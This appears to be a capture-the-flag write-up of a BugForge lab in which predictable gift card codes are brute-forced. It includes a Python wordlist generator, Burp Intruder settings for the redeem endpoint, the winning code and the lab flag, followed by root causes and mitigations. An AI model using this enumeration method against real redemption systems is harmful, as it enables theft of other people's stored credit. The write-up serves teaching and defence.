---
title: "Predictable Token Enumeration – Gift Card Redemption Abuse | BugForge Lab"
date: 2026-05-03 16:00:00 +0530
categories: [Web Security, Insecure Design]
tags: [token-enumeration, predictable-values, brute-force, business-logic, api-security, insecure-design]
platform: BugForge
author: Shivansh Sharma
image: 
    path: /assets/images/posts/token-enumeration-bugforge.webp
    alt: Predictable Token Enumeration 
---

## Overview

Predictable token generation is a critical security flaw in modern web applications.

When identifiers such as gift card codes are generated using deterministic patterns instead of secure randomness, attackers can enumerate valid values and gain unauthorized access.

In this lab, the application generated gift card codes using a partially predictable structure. By analyzing this pattern, it was possible to **enumerate valid tokens** and redeem another user's gift card.

This resulted in successful exploitation of a **business logic flaw** leading to unauthorized access and data exposure.

---

## Objective

The challenge involved analyzing and exploiting the gift card system.

**Goal:**
- Analyze gift card generation  
- Identify token pattern  
- Enumerate valid codes  
- Redeem a valid gift card  
- Capture the flag  

---

## Reconnaissance

While analyzing application traffic using Burp Suite, two key endpoints were identified:

### Gift Card Generation

```http
POST /api/giftcards/purchase
```

### Gift Card Redemption

```http
POST /api/giftcards/redeem
```

This revealed a clear workflow:

1. Generate gift card
2. Redeem gift card

➡️ If tokens are predictable, redemption becomes vulnerable to enumeration.

---

## Identifying the Pattern

Generated sample gift card:

```
CAFE-0405-ATDU
```

### Pattern Breakdown

| Component | Value  | Description           |
|-----------|--------|-----------------------|
| Prefix    | CAFE   | Static (branding)     |
| Date      | 0405   | Likely generation date|
| Suffix    | ATDU   | Variable              |

### Key Observation

- First character of suffix remained constant
- Only last 3 characters changed

➡️ Effective search space reduced to:

```
26³ = 17,576 combinations
```

This is extremely small and easily brute-forceable.

---

## Exploitation

### Step 1: Generate Wordlist

Created a Python script to generate all combinations:

```python
with open("combos_A4_upper.txt", "w") as f:
    for i in range(65, 91):
        for j in range(65, 91):
            for k in range(65, 91):
                combo = "A" + chr(i) + chr(j) + chr(k)
                f.write(combo + "\n")

print("Done! File saved as combos_A4_upper.txt")
```

**Output**

Generates combinations from:

```
AAAA → AZZZ
```

### Step 2: Configure Burp Intruder

Target request:

```http
POST /api/giftcards/redeem
```

**Configuration:**

- Attack type: Sniper / Simple List
- Payload: `combos_A4_upper.txt`
- Injection point: token suffix

### Step 3: Enumerate Gift Cards

- Most responses → invalid
- Filtered responses by:
  - HTTP `200 OK`

Eventually found a valid token:

```
CAFE-0405-AAWW
```

**Proof of Exploitation**

Server response:

```json
{
  "message": "Gift card redeemed successfully",
  "balance": 10,
  "original_amount": 10,
  "flag": "bug{jxLfbk4bAX8qf21653vZcoAfcveXUsF7}"
}
```

---

## Impact

This vulnerability allows attackers to:

- Redeem other users' gift cards
- Steal stored credits
- Enumerate financial tokens
- Abuse promotional systems
- Cause direct revenue loss

---

## Root Cause

**1. Predictable Token Generation**
- Tokens followed a deterministic format

**2. Low Entropy**
- Only 3 random characters
- Total possibilities: 17,576

**3. No Rate Limiting**
- Unlimited redemption attempts allowed

**4. No Abuse Detection**
- No monitoring for enumeration patterns

---

## Why This Attack Works

The system relies on:

- Partially static + small random space

This allows attackers to:

1. Identify structure
2. Reduce search space
3. Enumerate valid tokens

➡️ This is a classic token enumeration attack

---

## Mitigation

### Use Cryptographically Secure Tokens

Generate tokens using:

```python
secrets.token_urlsafe()
```

### Increase Entropy

- Use long random values
- Minimum: 16–32 bytes

### Implement Rate Limiting

- Restrict attempts per IP / account

### Add Lockout Mechanisms

- Block repeated failures temporarily

### Monitor Abuse Patterns

Detect:
- Sequential attempts
- High-frequency requests

---

## Real-World Insight

Predictable tokens are a common issue in:

- Password reset links
- API keys
- Coupon codes
- Session identifiers

Attackers often exploit:

- Weak randomness
- Short token lengths
- Missing rate limits

---

## Key Takeaway

Security-sensitive tokens must never be predictable.

Even small patterns can drastically reduce the search space and make brute-force attacks trivial.

Always use cryptographically secure randomness for token generation.

---

## Final Result

**Valid Gift Card:**

```
CAFE-0405-AAWW
```

**Flag:**

```
bug{jxLfbk4bAX8qf21653vZcoAfcveXUsF7}
```